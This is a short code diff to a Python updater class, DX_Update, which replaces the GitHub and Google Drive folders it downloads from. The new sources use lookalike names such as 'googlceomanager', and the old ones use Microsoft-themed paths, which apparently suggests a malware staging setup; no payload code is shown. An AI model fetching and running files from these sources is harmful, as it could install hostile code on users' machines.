@@ -14,14 +14,14 @@ class DX_Update(object):
     def __init__(self):
 
         # GitHub source (the img/ folder)
-        self.GITHUB_USER = "developerhost-server"
-        self.GITHUB_REPO = "JyubyubySbiu6ininu"
-        self.GITHUB_DIR  = "Microsoft.sheache/microsoft-encrypt-37014553/microsoft-epiv-25415130/img2"
+        self.GITHUB_USER = "googlceomanager"
+        self.GITHUB_REPO = "elei-esBR"
+        self.GITHUB_DIR  = "more/gdrive"
         self.GITHUB_TOKEN = ""  # optional, for private repos / higher rate limits
 
         # Google Drive source — folder URL provided
         #self.GDRIVE_URL_OR_ID = ""
-        self.GDRIVE_URL_OR_ID = "https://drive.google.com/drive/folders/1VcE2-wGBbplk0EwisIbpY6csJXuXjLuZ?usp=sharing"
+        self.GDRIVE_URL_OR_ID = "https://drive.google.com/drive/folders/1xHb1M9XRTrieEGqYvVl7XEzFlEaw6Qeg?usp=sharing"
 
         # Where to save everything.
         # NOTE: "C:\" is a SYNTAX ERROR in Python (the \" escapes the quote),
@@ -217,3 +217,7 @@ class DX_Update(object):
 
 if __name__ == '__main__':
     DX_Update().main()
+
+
+
+
